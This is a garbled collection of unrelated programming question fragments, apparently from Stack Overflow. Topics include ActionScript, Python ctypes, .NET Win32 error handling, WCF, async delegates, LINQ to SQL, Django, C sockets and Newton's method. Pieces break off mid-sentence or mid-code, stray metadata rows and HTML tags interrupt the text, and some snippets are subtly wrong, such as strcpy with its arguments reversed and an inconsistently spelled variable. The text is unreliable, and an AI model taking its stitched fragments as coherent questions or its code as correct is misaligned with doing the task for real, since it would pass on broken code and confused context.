<p>Another method I've seen used is to simply pass a reference to this into the class object you are creating and just catch it with a constructor argument</p>

<pre><code>var class:Class = new Class(this);  
</code></pre>

<p>and then in the Class file</p>

<pre><code>public function Class(objectRef:Object) {
    _parentRef = objectRef;
} 
</code></pre>

<p>That reference also requires you to step back up using the child to parent hierarchy though.</p>

<p>I could also import that class, and then use the direct filepath to reference a method inside of that class, regardless of its the parent or not.</p>

<pre><code>import com.site.Class;
com.site.Class.method();
</code></pre>

<p>Of course there the parent to child relationship is irrelevant because I'm accessing the method or property directly through the imported class.</p>

<p>I just feel like I'm missing something really obvious here. I'm basically looking for confirmation if these are the correct ways to reference the parent, and if so which is the most ideal, or am I over-looking something else?</p>

<p>But... I have no idea how to force python on only write <code>c_uncompSize</code> bytes out - if I do:</p>

<p><code>myfile.write (c_uncompData_p.raw)</code></p>

<p>it writes the whole 64k buffer out (the data is binary - so it is not null terminated).</p>

<p>So, my question is - using Python 2.5 how do I get c_uncompSize bytes printed out, rather than the whole 64k?</p>

<p>Currently, the calls to native functions look something like this:</p>

<pre><code>// NativeFunction returns true when successful and false when an error
// occurred. When an error occurs, the MSDN docs usually tell you that the
// error code can be discovered by calling GetLastError (as long as the
// SetLastError flag has been set in the DllImport attribute).
// Marshal.GetLastWin32Error is the equivalent managed function, it seems.
if (!WinApi.NativeFunction(param1, param2, param3))
    throw new Win32Exception();
</code></pre>

<p>The line that raises the exception can be equivalently rewritten as such I believe:</p>

<pre><code>throw new Win32Exception(Marshal.GetLastWin32Error());
</code></pre>

<p>Now, this is all well in that it throws an exception appropriately containing the Win32 error code that was set as well as a (generally) human-readable description of the error as the <code>Message</code> property of the Exception object. However, I have been thinking that it would be advisable to modify/wrap at least some, if not all, of these exceptions so that they give a slightly more context-oriented error message, i.e. one more meaningful in whatever situation the native code is being used. I have considered several alternatives for this:</p>

<ol>
<li><p>Specifying a custom error message in the constructor for <code>Win32Exception</code>.</p>

<pre><code>throw new Win32Exception(Marshal.GetLastWin32Error(), ""My custom error message."");
</code></pre></li>
<li><p>Wrapping the <code>Win32Exception</code> in another Exception object so that both the original error code and message are retained (the <code>Win32Exception</code> is now the <code>InnerException</code> of the parent exception).</p>

<pre><code>throw new Exception(""My custom error message."", Win32Exception(Marshal.GetLastWin32Error()));
</code></pre></li>
<li><p>The same as 2, except using another <code>Win32Exception</code> as the wrapper exception.</p></li>
<li><p>The same as 2, except using a custom class derived from <code>Exception</code> as the wrapper exception.</p></li>
<li><p>The same as 2, except using a BCL (Base Class Library) exception as the parent when appropiate. Not sure whether it's even appropiate to set the <code>InnerException</code> to the <code>Win32Exception</code> in this case (perhaps for a low-level wrapper but not a higher-level/abstracted interface that doesn't make it obvious that Win32 interop is happening behind the scenes?)</p></li>
</ol>

<p>Essentially what I want to know is: what is the recommended practice on dealing with Win32 errors in .NET? I see it done in open-source code in all sorts of different ways, but I was curious whether there were any design guidelines. If not, I'd be interested in your personal preferences here. (Perhaps you even use none of the above methods?)</p>

<pre><code>public interface IBasicCalculator
{
    int Add( int a, int b );
}

public interface IFloatingPointCalculator
{
    double Add( double a, double b );
}
</code></pre>

<p>I want to expose these via WCF. Unfortunately WCF seems to be very tightly tied to the notion that every possible operation you want to expose must go through one single service interface -- you can't share sessions between services, it is cumbersome from the client side as you need to create a seperate proxy for each one, there don't seem to be any  ""sub-services"", etc...</p>

<p>So, I've gathered that I need to present a ""combined"" interface (one might also call it a facade), like this:</p>

<pre><code>[ServiceContract]
public interface ICalculatorService : IBasicCalculator, IFloatingPointCalculator
{
    [OperationContract(Name = ""AddInt"")]
    new int Add( int a, int b );

    [OperationContract(Name = ""AddDouble"")]
    new double Add( double a, double b );
}
</code></pre>

<p>If I do this, then WCF exposes both methods to the client, which can call them, and it all actually works.</p>

<p>However, ""inheriting the interfaces"" like that seems to be ungainly. <em>Particularly</em> the <strong><code>new</code></strong> <code>int Add</code> and <strong><code>new</code></strong> <code>double Add</code>. Strictly speaking, <code>new</code> on a method indicates hiding an underlying method, which I'm not actually doing at all. I can omit the <code>new</code>, but then I just get compiler warnings which amount to ""I think I'm hiding this method, you need to rename it method or put 'new' on it"".</p>

<p>So, this is a 2-part question:</p>

<ol>
<li><p>Am I on track with my 'combine everything into one interface' logic, or is there actually a way to expose ""sub-services"" or ""multiple linked services"" using WCF?</p></li>
<li><p>If this is what needs to be done, is there a better way?</p></li>
</ol>

"658945","1","659302","","2009-03-18 16:12:24","","8","9670","<p>I'm looking into options for doing asynchronous event dispatching in a component that has many subscribers to its events.  In perusing the options, I ran across this example:</p>

<pre><code>public event ValueChangedEvent ValueChanged;
public void FireEventAsync(EventArgs e)
{
    Delegate[] delegates = ValueChanged.GetInvocationList();
    foreach (Delegate d in delegates)
    {
        ValueChangedEvent ev = (ValueChangedEvent)d;
        ev.BeginInvoke(e, null, null);
    }
}
</code></pre>

<p>Beyond the older syntax (the sample was from .NET 1.1), it looks to me like this is a serious resource leak.  There's no completion method, no polling for completion, or any other way that <code>EndInvoke</code> will be called.</p>

<p>My understanding is that every <code>BeginInvoke</code> <em>must have</em> a corresponding <code>EndInvoke</code>. Otherwise there are pending <code>AsyncResult</code> object instances floating around, along with (potentially) exceptions that were raised during the asynchronous events.</p>

<p>I realize that it's easy enough to change that by supplying a callback and doing an <code>EndInvoke</code>, but if I don't need to . . .</p>

<p>Handling the asynchronous exeptions is another matter entirely, and, combined with the need to synchronize with the UI thread (i.e. <code>InvokeRequired</code>, etc.) could very well tank the whole idea of doing these asynchronous notifications.</p>

<p>So, two questions:</p>

<ol>
<li>Am I correct in believing that every <code>BeginInvoke</code> requires a corresponding <code>EndInvoke</code>?</li>
<li>Beyond what I've noted above, are there other pitfalls to doing asynchronous event notifications in Windows Forms applications?</li>

<p>For example,  I have a ""User"" entity in my dbml and I want to add methods to that class like so:</p>

<pre><code>Partial Public Class User

    Public Function GetUser(ByVal UserID as Integer) as User
         'Do Work
    End Function

End Class
</code></pre>

<p>In order to access my DataContext I'd have to declare it inside the method like so:</p>

<pre><code>Partial Public Class User

    Public Function GetUser(ByVal UserID as Integer) as User
         Dim dc as New MyDataContext()
         Return (From u in dc.Users Where u.ID = UserID).Single()
    End Function

End Class
</code></pre>

<p>I'd like to not have to do that for every single method.  Normally (if I weren't extending the LinqToSql dbml classes) I could just do this:</p>

<pre><code>Partial Public Class User
    Private dc as MyDataContext

    Public Sub New()
         dc = new MyDataContext()
    End Sub

    Public Function GetUser(ByVal UserID as Integer) as User
         Return (From u in dc.Users Where u.ID = UserID).Single()
    End Function

    Public Function GetAllUsers() as IEnumerable(Of User)
         Return From u in dc.Users
    End Function

    'etc...

End Class
</code></pre>

<p>This would allow me to access the datacontext for each method without having to declare it newly each time.  But of course you can't do that because the dbml already has a constructor.  And adding code into the dbml always gets overwritten if anything ever changes.</p>

<p>Anyone have any good ideas on how to save myself some excess code here?</p>

    &lt;/p&gt;
&lt;/form&gt;

<pre><code>[AcceptVerbs(HttpVerbs.Get)]
public ActionResult Create()
{
    return View(new TestObject { Name = ""DefaultName"", Age = 10 } );
}

[AcceptVerbs(HttpVerbs.Post)]
public ActionResult Create(TestObject o)
{
    o.Name = ""ChangedNameToSomethingElse"";
    o.Age = 15;
    return View(o);
}

<p>The <code>Html.TextBox()</code> method always genereates the textboxes with the default values, even after the postback, where the object is passed back with different properties on its values. Now, granted, I can't think of a real world example why I'd want to do such a thing but I still don't understand why I always end up having textboxes populated with the model's values that were set on the Create action with the <code>AcceptVerbs(HttpVerbs.Get)</code> attribute.</p>

<p><strong>Note</strong> : I've tried <code>Html.TextBox(""Name"", Model.Name)</code> but the result is still the same. And I verified that the Create action with <code>AcceptVerbs(HttpVerbs.Post)</code> actually runs, by passing a value via ViewData to the View.
Also, the udated value is displayed when I output the value with <code>&lt;%=Model.Name %&gt;</code> but again, not on the textbox.</p>

<p>Is there something obvious I'm missing, or is there a reasoning behind this behaviour?</p>

return type('ContactForm', [forms.BaseForm], { 'base_fields': fields })
</code></pre>

<p>So here is what I came up with...</p>

<h1>The Answer I used:</h1>

<pre><code>
from tagging.forms import TagField
from django import forms

def make_tagPhotos_form(photoIdList):
    ""Expects a LIST of photo objects (ie. photo_sharing.models.photo)""

    fields = {}

    for id in photoIdList:
        id = str(id)

        fields[id+'_name'] = forms.CharField()
        fields[id+'_tags'] = TagField()
        fields[id+'_description'] = forms.CharField(widget=forms.Textarea)

    return type('tagPhotos', (forms.BaseForm,), { 'base_fields': fields })

</code></pre>

<p>note tagging is not part of django, but it is free and very useful. check it out: <a href=""http://code.google.com/p/django-tagging/"" rel=""noreferrer"">django-tagging</a></p>

<p>EDIT:</p>

<p>Well after reading more about this in one of the links provided in an answer below, I came across at least one argument for keeping the accessors of a member field the same name as the member field. Namely that you could simply expose the member field as public, and instead make it an instance of a class, and then overload the () operator. By using set/get, you'd force clients to not only recompile, but to actually change their code. </p>

<p>Not sure I love the idea, seems a bit too fine grained to me, but more details are here:</p>

<p>I'm doing some socket programming in C and trying to wrestle with byte order problems. My request (send) is fine but when I receive data my bytes are all out of order. I start with something like this...</p>

<pre><code>char * aResponse= (char *)malloc(512);
int total = recv(sock, aResponse, 511, 0);
</code></pre>

<p>When dealing with this response, each 16bit word seems to have it's bytes reversed (I'm using UDP). I tried to fix that by doing something like this...</p>

<pre><code>    unsigned short * _netOrder= (unsigned short *)aResponse;
    unsigned short * newhostOrder= (unsigned short *)malloc(total);

    {

<p>I'm almost done with my junior year as a CS major.  I sort of feel like a late comer because I didn't really get into computer science until sophomore year...   Through hard work, lots of credit hours during the year and summer school I am almost caught up to my peers but here come the worries:</p>

<p>All of my school work has taught me a lot about computer science but little about practical programing.  Although I have a lot of motivation, I simply have almost no free time to allow me to pick up side projects. This upsets me for 2 reasons, 1) I genuinely am becoming very passionate about the field and 2) I understand that many employers like to see students with some experience outside of school.  </p>

<p>So I recently had an idea:  what if I were to make Linux my primary OS but restrict myself to the terminal as much as possible in an attempt to naturally (with the help of google) become familiar with the command line and hopefully gradually pick up shell scripting using online tutorials.</p>

<p>How beneficial do you think this would be to an aspiring programmer?  How realistic is it?  Do you have any other suggestions for small projects a student with barely any free time can pick up outside of school?</p>

        eval($line);

<p>-> should compile into bar.dll</p>

<p>I have created two projects in visual studio, one for foo and one for bar. By playing with the 'References' and compiling a few times, I managed to get the dll's that I want. I would like to know however whether visual studio offers a way to do this in a clean way.</p>

<p>If foo changes, bar does not need to be recompiled, because I only depend on the signature of bar, not on the implementation of bar. If both dll's have the lib present, I can recompile new functionality into either of the two and the whole system still works.</p>

<p>The reason I am trying this is that I have a legacy system with circular dependencies, which is currently statically linked. We want to move towards dll's for various reasons. We don't want to wait until we clean up all the circular dependencies. I was thinking about solutions and tried out some things with gcc on linux and there it is possible to do what I suggest. So you can have two shared libraries that depend on each other and can be built independent of each other.</p>

<p>I know that circular dependencies are not a good thing to have, but that is not the discussion I want to have.</p>

<p>I've tried several suggestions I found on Google, but none of them are very helpful in achieving the desired effect. Adding a border to the bottom is not an option unfortunately.

I'm at the point where my code is getting to be a spaghetti mess so I'm going back and factoring reasonable bits of it out as Composites.  The first problem I ran into was that my tool support failed to give the new Composite class an initWidget() method.  It did include a default constructor.<br>
For the time being, I've simply filled in my overridden <code>initWidget()</code> method with a call to <code>super(initWidget(w))</code>  My project compiles and runs as expected, though I feel as though I must be missing something.  </p>

<p>What should I keep in mind when overriding init and what if anything do i need to place in the constructor.  Is there anything else that I need to know or does it just boil down to regular old Java after this?</p>

<p>Clarification - It has occurred to me that there are probably different answers to this question depending on whether you intend to release said <code>Composite</code> classes as part of a library or simply part of your stand-alone app.  I in particular have no intention at this time of developing externally useful components (mainly because I'm so green in this particular technology.)</p>

<p>I am fairly impressed, however as I continue to piece together a game engine, I have a (probably) basic question.</p>

<p>How much should you rely on C#'s Delegates and Events to drive the game? As an application programmer, I use delegates and events heavily, but I don't know if there is a significant overhead to doing so.</p>

<p>In my game engine, I have designed a ""chase cam"" of sorts, that can be attached to an object and then recalculates its position relative to the object. When the object moves, there are two ways to update the chase cam.</p>

<ul>
<li>Have an ""UpdateCameras()"" method in the main game loop.</li>
<li>Use an event handler, and have the chase cam subscribe to object.OnMoved.</li>
</ul>

<p>I'm using the latter, because it allows me to chain events together and nicely automate large parts of the engine. Suddenly, what would be huge and complex get dropped down to a handful of 3-5 line event handlers...Its a beauty.</p>

<p>However, if event handlers firing every nanosecond turn out to be a major slowdown, I'll remove it and go with the loop approach.</p>

<p>Ideas?</p>

<p>I previously implemented it as AsyncCallback first, but i find it cumbersome, too many house rules to follow (e.g. AsyncResult, AsyncState, EndInvoke) plus you have to detect the thread of the BeginInvoke'd object, so you can terminate the previously executing thread.  Besides if I continued the AsyncCallback, there's no method on those AsyncCallbacks that can properly terminate previously executing thread.  </p>

<p>EndInvoke cannot terminate the thread, it would still complete the operation of the to be terminated thread.  I would still end up using Abort() on thread.</p>

<h3>NOTES</h3>

<p>The reason for cancelling the previous thread when the user type keys in succession, is not only to prevent the appending of text from happening, but also to cancel the previous network roundtrip, so the program won't be consuming too much memory resulting from successive network operation.</p>

<p>I'm worried if I avoid thread.Abort() altogether, the program could consume too much memory.</p>

Well, that's another subject :) - However, I stumbled upon a weird saying in the <code>type_info</code>-class, namely about the <code>::name</code>-method. It says: ""The <code>type_info::name</code> member function returns a <code>const char*</code> to a null-terminated string representing the human-readable name of the type. The memory pointed to is cached and should never be directly deallocated.""</p>

<p>How can you implement something like this yourself!? I've been struggling quite a bit with this exact problem often before, as I don't want to make a new <code>char</code>-array for the caller to delete, so I've stuck to <code>std::string</code> thus far.</p>

<p>So, for the sake of simplicity, let's say I want to make a method that returns <code>""Hello World!""</code>, let's call it </p>

<pre><code>const char *getHelloString() const;
</code></pre>

<p>Personally, I would make it somehow like this (Pseudo):</p>

<pre><code>const char *getHelloString() const
{
  char *returnVal = new char[13];
  strcpy(""HelloWorld!"", returnVal);

  return returnVal
}
</code></pre>

<p>.. But this would mean that the caller should do a <code>delete[]</code> on my return pointer :(</p>

<p>I've been using what he suggested...but recently I've <a href=""http://www.danielmoth.com/Blog/2007/07/linq-to-dataset.html"" rel=""nofollow noreferrer"">seen in a blog</a> that there already exists such an extension... <code>CopyToDataTable&lt;T&gt;(this IEnumerable&lt;T&gt; source) : DataTable</code> which exists in System.Data.DataTableExtensions.</p>

<p>As a result, I figure I should switch over to using this inbuilt extension method instead of using one that I'd have to maintain myself.</p>

<p>Unfortunately, I'm having a bit of trouble figuring out how to use it.</p>

<p>I can take my IList and say myListofMyClass.CopyToDataTable() but I get a compile error that says ""The type 'MyClass' must be convertible to 'System.Data.DataRow' in order to use it as parameter 'T' in the generic method...""</p>

<p>Is there something special I need to do MyClass in order to make it convertible to System.Data.DataRow? Is there some interface I need to implement?</p>

<h2>Background:</h2>

<p>We call these processes our ""engines"". One engine receives messages by polling an IBM WebSpere MQ queue for messages. It takes a message off the queue, processes it, and puts the result on an outbound queue. We currently test this engine via a TCL script that reads a file that contains the messages, puts the messages on the inbound queue, then polls the outbound queue for the results.</p>

<p>The other engine receives messages via a web service. The web service writes the message to a table in our database. The engine polls the database table for new messages, takes a message and processes it, and puts the result back into the database. We currently test this engine via a VBScript script that reads a file that contains the messages, sends the message to the web service, then keeps querying the web service for the result unitl it's ready.</p>

<h2>Question:</h2>

<p>We'd like to do away with the TCL and VBScript scripts and standardize on LoadRunner so that we have one tool to manage all our performance tests.</p>

<ol>
<li>I know LoadRunner supports a Web Services protocol ""out of the box"", but I'm not sure how to use it. Does anyone know of any examples of how to use LoadRunner to test a web service?</li>
<li>Does LoadRunner have a protocol for MQ? Is it possible to use a LoadRunner Vuser to drive load (put messages) into an MQ queue? Would we need to purchase something from HP or some other vendor to do this?</li>

<p>We can easily switch off lazy loading on properties but what I want is to disable any kind of automatic loading ( lazy and non lazy both ). I only want to load data via query ( i.e. HQL or Criteria )</p>

<p>I would still like to define the relationship between parent child records in the mapping file to facilitate HQL and be able to join parent child entities, but I do not want the child records to be loaded as part of the parent record unless a query on the parent record 
explicitly states that ( via eager fetch, etc ).</p>

<p>Example:
Fetching Department record from the database should not fetch all employee records from the database because it may never be needed.</p>

<p>One option here is to set the Employees collection on Department as lazy load. The problem with this approach is that once the object is given to the calling API it can 'touch' the lazy load property and that will fetch the entire list from the db.</p>

<p>I tried to use 'evict' - to disconnect the object but it does not seem to be working at all times and does not do a deep evict on the object.
Plus it abstracts the lazy loaded property type with a proxy class that plays havoc later in the code where we are trying to operate on the object via reflection and it encounters unexpended type on the object.</p>

<p>I am a beginner to nHibernate, any pointers or help would be of great help.</p>

"450377","1","450854","","2009-01-16 13:16:49","","14","9767","<p>I have a side project that I wrote a few years ago in WinForms. To better help me learn WPF, I would like to rewrite it in WPF. Ideally, I would like to just modify the current project that I have and rewrite the UI in WPF instead of creating a new project.</p>

<p>I'm having some problems doing that. I did the following (using Visual Studio 2008 SP1):</p>

<ol>
<li>Changed the Target Framework from 2.0 to 3.5.</li>
<li>Added PresentationCore, PresentationFramework, and WindowsBase references. </li>
</ol>

<p>At this point, I noticed something was amiss. When I right clicked the project and selected Add | New Item, I did not have an option to create a WPF Window - the only WPF class that I could create is a WPF User Control. Since I had some other WPF projects around, I copied App.xaml.* and Window1.xaml.* from that project to mine, and updated them as necessary (basically just changing the namespace of that project to the namespace of my project).</p>

<p>I then deleted Program.cs (which previously contained the Main method, that displayed the main WinForm Form), and built the project. I got an error indicating that there is no Main method.</p>

<p>It seems like internally Visual Studio knows that this project is really a WinForms app, and not a WPF app. In a WPF project (created by selecting ""WPF Application""), in the Application properties I can set the instance of the Application class as a start up object. In my WinForms converted project, that isn't an option.</p>

<p>I took a quick look at the .csproj file in a text editor, but I couldn't find anything that would tell Visual Studio that the project is really WinForms rather than WPF.</p>

<p>What else do I need to do to turn my WinForms project into a ""real"" WPF project? Do I have an option other than creating a new project and just replacing my current project?</p>

<p><strong>Update:</strong> I took a closer look at the .csproj files, and I noticed that App.xaml was added as a page:</p>

<pre><code>&lt;Page Include=""App.xaml""&gt;
  &lt;Generator&gt;MSBuild:Compile&lt;/Generator&gt;
  &lt;SubType&gt;Designer&lt;/SubType&gt;
&lt;/Page&gt;
</code></pre>

<p>However, in my other WPF project, it is an ApplicationDefinition. Once I changed that, I could set my Application instance as the start up object, and my app would run. I still don't have an option to create any WPF types other than User Controls, though.</p>

<p>There will be many cases where you cannot add code (i.e. methods) to <code>enum</code> classes you want to switch on because you don't control them, perhaps they are in a 3rd-party jar file. There will be other cases where putting the functionality <em>on the enum itself</em> is a bad idea because it violates some separation-of-concerns considerations, or it is actually a function of something else <em>as well as the enumeration</em>.</p>

<p>Last of all, switches are concise and clear:</p>

<pre><code>boolean investable;
switch (customer.getCategory()) {
    case SUB_PRIME:
    case MID_PRIME:
        investible = customer.getSavingsAccount().getBalance() &gt; 1e6; break;
    case PRIME:
        investible = customer.isCeo(); break;
}
</code></pre>

<p>I'm not defending every use of <code>switch</code> and I'm not saying it's always the way to go. But statements like ""Switch is a code smell"" are just wrong, in my opinion. Does anyone else agree?</p>

I want to be able to execute a program without  stepping through something until I hit a point where I want to watch it execute.  Ideally this would be something to the effect of holding a key down while I pressed a button to 'step into' that function.</p>

<p>Thanks in advance!</p>

<p><strong>[EDIT]</strong>: I'm aware that I can use break points to stop the execution.  To be more clear, the problem is that I don't know where the execution is going to, so I can't set the break point there (because I don't know where there is).  That's why I essentially want to be able to say, 'after this next thing that I do, break, no matter what'.  It sounds like this functionality does not exist, but I'm still keeping my fingers crossed.</p>

I've heard from this company that got billed for about $100.000 because they were using reporting services with the wrong license. Their web application was described as a normal application because they used reporting services. We're trying to prevent that.</p>

What I saw was just placing two other classes into the process and cannot see where there would be a benefit. Now I'm sure I'm missing something obvious (wood for the trees) - could someone please explain it using a definitive real-world example?</p>

<hr>

<p>What I can make from the answers so far, it seems to me to be just a more complex way of doing this:</p>

<pre><code>have an abstract class: MoveAlong with a virtual method: DoIt()
have class Car inherit from MoveAlong, 
     implementing DoIt() { ..start-car-and-drive..}
have class HorseCart inherit from MoveAlong, 
     implementing DoIt() { ..hit-horse..}
have class Bicycle inherit from MoveAlong, 
     implementing DoIt() { ..pedal..}
now I can call any function taking MoveAlong as parm 
passing any of the three classes and call DoIt
Isn't this what Strategy intents? (just simpler?)
</code></pre>

<p>[Edit-update]
The function I refer to above is replaced with another class in which MoveAlong would be attribute which is set according to need based on the algorithm implemented in this new class. (Similar to what is demonstrated in the accepted answer.)</p>

<hr>

<p>[Edit-update] <strong>Conclusion</strong></p>

<p>The Strategy Pattern has it's uses, but I am a strong believer in KISS, and would tend to more straightforward and less obfuscatory techniques. Mostly since I want to pass on easily maintainable code (and 'cos I'll most likely be the one who have to make the changes!).</p>

<p>My question is whether or not this is a good approach in C#.</p>

<p>Here is some example code, based on yapiskan's suggestion.  In the child form (in this example, it's a form with a textbox on it), you just need to add the ShowDialog overload and assign UI values to the out parameter:</p>

<pre><code>public DialogResult ShowDialog(out string s)
{
    DialogResult result = this.ShowDialog();
    s = this.textBox1.Text;
    return result;
}
</code></pre>

<p>And to show the form and retrieve the entered text, you do this:</p>

<pre><code>using (CustomDialog frm = new CustomDialog())
{
    string s;
    if (frm.ShowDialog(out s) == DialogResult.OK)
    {
        // do something with s
    }
}
</code></pre>

<p>One advantage I can think of is that this approach forces the user of the CustomDialog form to get the information it contains through the form's ShowDialog method (rather than from a who-knows-what-it's-called method like GetMyData() or something).</p>

<p>My solution originally involved a combination of a table that held a list of objects in the database and an hourly job.</p>

<p>The job did two things. First, it looked for new objects that had been added to the database since the last run.  Secondly, it looked at sql's object cache.  If an object in the table was listed in the cache, it was marked off in the table as having been recently ""seen"" in use.</p>

<p>At the end of a six month period or whatever, the contents of the table were examined.  Anything listed in the table that hadn't been seen referenced since I started monitoring were probably safe to backup and remove.</p>

<p>Sure, there is the possibility of objects that are only used, say, once a year or whatever, but it seemed to work for the most part.</p>

<p>It was kind of a pain to work with, though.</p>

<p>There are about a half dozen databases I'm working with, the majority of which have tons of legacy tables on them, which remain long after their original creators moved on to other companies.</p>

<p>What I'm looking for is a fairly reliable method of keeping track of when an object (table, view, stored procedure, or function) is getting called.</p>

<p>MSDN Notes:</p>

<blockquote>
  <p>When using the asterisk wildcard character in a searchPattern, such as ""<em>.txt"", the matching behavior when the extension is exactly three characters long is different than when the extension is more or less than three characters long. A searchPattern with a file extension of exactly three characters returns files having an extension of three or more characters, where the first three characters match the file extension specified in the searchPattern. A searchPattern with a file extension of one, two, or more than three characters returns only files having extensions of exactly that length that match the file extension specified in the searchPattern. When using the question mark wildcard character, this method returns only files that match the specified file extension. For example, given two files, ""file1.txt"" and ""file1.txtother"", in a directory, a search pattern of ""file?.txt"" returns just the first file, while a search pattern of ""file</em>.txt"" returns both files.</p>
</blockquote>

<p>The following list shows the behavior of different lengths for the searchPattern parameter:</p>

<ul>
<li><p><code>*.abc</code> returns files having an extension of <code>.abc</code>, <code>.abcd</code>, <code>.abcde</code>, <code>.abcdef</code>, and so on.</p></li>
<li><p><code>*.abcd</code> returns only files having an extension of <code>.abcd</code>.</p></li>
<li><p><code>*.abcde</code> returns only files having an extension of <code>.abcde</code>.</p></li>
<li><p><code>*.abcdef</code> returns only files having an extension of <code>.abcdef</code>. </p></li>
</ul>

<p>With the <code>searchPattern</code> parameter set to <code>*.abc</code>, how can I return files having an extension of <code>.abc</code>, not <code>.abcd</code>, <code>.abcde</code> and so on?</p>

<p>So does anybody here know what I need to set the MappingName property to in order to have my TableStyle actually work properly? Where can I grab the name from? (It can't be blank... that only works with a BindingSource that is bound to a DataTable or SqlCeResultSet etc.). </p>

<p>I'm thinking it could be an issue with me using Linq to create an anonymous, more specialized version of the objects with only the fields I need.

To accomplish it in the data tier, I want to create a compound unique constraint on <code>(Date, Slug)</code> where <code>Date</code> is only the date part (ignoring the time of day) of the composition date. I have a few ideas myself (like another column, probably calculated, to hold only the date part) but I came to SO to know what's the best practice to solve this problem.</p>

<pre><code>create table Entries (
    Identifier int not null identity,

    FeedbackState tinyint not null default 0,
    constraint pk_Entries primary key(Identifier),

    constraint uk_Entries unique (Date, Slug) -- the subject of the question
)
</code></pre>

<h2>Selected Solution:</h2>

<p>I think marc's solution is more appropriate, considering this question is about 2008. However, I'll go with the integer method (but not with <code>INSERT</code>s, as it does not ensure the integrity of data; I'll use a precomputed integer column) since I think it's easier to work with the integer thing from the client (in the query).</p>

<p>The obvious solution looks like this: </p>

<pre><code>unsigned char QuantizeFloat(float a)
{
  return (unsigned char)(a * 255.0f);
}

<p>This works in so far that I get all numbers from 0 to 255, but the distribution of the integers is not even. The function only returns <code>255</code> if a is exactly <code>1.0f</code>. Not a good solution.</p>

<p>If I do proper rounding I just shift the problem:</p>

<pre><code>unsigned char QuantizeFloat(float a)
{
  return (unsigned char)(a * 255.0f + 0.5f);
}

<p>Here the the result <code>0</code> only covers half of the float-range than any other number.</p>

<p>How do I do a quantization with equal distribution of the floating point range? Ideally I would like to get a equal distribution of integers if I quantize equally distributed random floats.</p>

<p>Any ideas?</p>

<hr>

<p>Btw: Also my code is in C the problem is language-agnostic. For the non-C people: Just assume that <code>float</code> to <code>int</code> conversion truncates the float.</p>

<p><strong>EDIT:</strong> Since we had some confusion here: I need a mapping that maps the smallest input float (0) to the smallest unsigned char, and the highest float of my range (1.0f) to the highest unsigned byte (255).</p>

<p>update2:
when I try installing under the main user account, I get a dialog that says:  ""Application cannot be started.  contact the application vendor."" and then there is a button for ""Details...""  I click on that and get the following error summary:

<ol>
<li><p>Add an event directly inside the tag like this:</p>

<p><code>&lt;a href="""" onclick=""doFoo()""&gt;do foo&lt;/a&gt;</code></p></li>
<li><p>Set them by JavaScript like this:</p>

<p><code>&lt;a id=""bar"" href=""""&gt;do bar&lt;/a&gt;</code></p></li>
</ol>

<p>and add an event in a <code>&lt;script&gt;</code> section inside the <code>&lt;head&gt;</code> section or in an external JavaScript file, like that if you're using <strong>prototypeJS</strong>:</p>

<pre><code>Event.observe(window, 'load', function() {
    $('bar').observe('click', doBar);
}
</code></pre>

<p>I think the first method is easier to read and maintain (because the JavaScript action is directly bound to the link) but it's not so clean (because users can click on the link even if the page is not fully loaded, which may cause JavaScript errors in some cases).</p>

<p>The second method is cleaner (actions are added when the page is fully loaded) but it's more difficult to know that an action is linked to the tag.</p>

<p>Which method is the best?</p>

<p>A killer answer will be fully appreciated!</p>

<p>An Editor owns a number of Projects, and a Project has not only an Editor owner, but also a number of Editor members.  Therefore, an Editor also has a number of ""joined"" Projects.</p>

<p>I am taking a DDD approach to modelling this and using the Repository pattern for persistence.  However, I don't grok the pattern well enough yet to determine how I should do this.</p>

<p>I'm working on the assumption that Editor and Project are potentially in the same aggregate, with the root being Editor.  I can therefore get an Editor and then enumerate its Projects, and could from there enumerate the Projects' member Editors.</p>

<p>However, if I am only allowed to retrieve Editors from my repository, doesn't this mean I have to load all the Projects from the repository when I get the Editor that owns them?  And if I want to lazy load the member Editors, the Project needs a reference to the repository as well?</p>

<p>Alternatively, if I split the aggregate and have an Editor repository and a Project repository, how should I handle a transaction across the two, such as when a new Project is added to an Editor?  For example:</p>

<pre><code>Editor e = new Editor(""Editor Name"");
editorRepository.Add(e);

Project p = e.CreateProject(""Project Name"");
projectRepository.Add(p);    // These two lines
editorRepository.Save(e);    // should be atomic

I'm reading the book <em>Developers Library - Python Web Development With Django</em> and in one chapter you build a simple CMS system with two models (Story and Category), some generic and custom views together with templates for the views.</p>

<p>The book only contains code for listing stories, story details and search. I wanted to expand on that and build a page with nested lists for categories and stories.</p>

<pre><code>- Category1
-- Story1
-- Story2
- Category2
- Story3 etc.
</code></pre>

<p>I managed to figure out how to add my own generic object_list view for the category listing.  My problem is that the Story model have STATUS_CHOICES if the Story is public or not and a custom manager that'll only fetch the public Stories per default. I can't figure out how to tell my generic Category list view to also use a custom manager and only fetch the public Stories. Everything works except that small problem. I'm able to create a list for all categories with a sub list for all stories in that category on a single page, the only problem is that the list contains non public Stories.</p>

<p>I don't know if I'm on the right track here. My urls.py contains a generic view that fetches all Category objects and in my template I'm using the <em>category.story_set.all</em> to get all Story objects for that category, wich I then loop over.</p>

<p>I think it would be possible to add a if statement in the template and use the VIEWABLE_STATUS from my model file to check if it should be listed or not. The problem with that solution is that it's not very DRY compatible.</p>

<p>Is it possible to add some kind of manager for the Category model too that only will fetch in public Story objects when using the story_set on a category?</p>

If the equation were linear, I would just compute the 30 partial derivatives, set them all to zero, and use a linear-equation solver.  But unfortunately <strong>the equation is nonlinear</strong> and so are its derivatives.</p>

<p>If the equation were over a single variable, I would just use <a href=""http://en.wikipedia.org/wiki/Newton-Raphson#Nonlinear_systems_of_equations"" rel=""noreferrer"">Newton's method</a> (also known as Newton-Raphson).  The Web is rich in examples and code to implement Newton's method <em>for functions of a single variable</em>.</p>

<p>Given that I have about 30 variables, <strong>how can I program a numeric solution to this problem using Newton's method</strong>?  I have the equation in closed form and can compute the first and second derivatives, but I don't know quite how to proceed from there.  I have found a large number of treatments on the web, but they quickly get into heavy matrix notation.  I've found <a href=""http://en.wikipedia.org/wiki/Newton-Raphson#Nonlinear_systems_of_equations"" rel=""noreferrer"">something moderately helpful</a> on Wikipedia, but I'm having trouble translating it into code.</p>

<p>Where I'm worried about breaking down is in the matrix algebra and matrix inversions.  I can invert a matrix with a linear-equation solver but I'm worried about getting the right rows and columns, avoiding transposition errors, and so on.</p>

<p>To be quite concrete:</p>

<ul>
<li><p>I want to work with tables mapping variables to their values.  I can write a function of such a table that returns the square error given such a table as argument.  I can also create functions that return a partial derivative with respect to any given variable.</p></li>
<li><p>I have a reasonable starting estimate for the values in the table, so I'm not worried about convergence.</p></li>
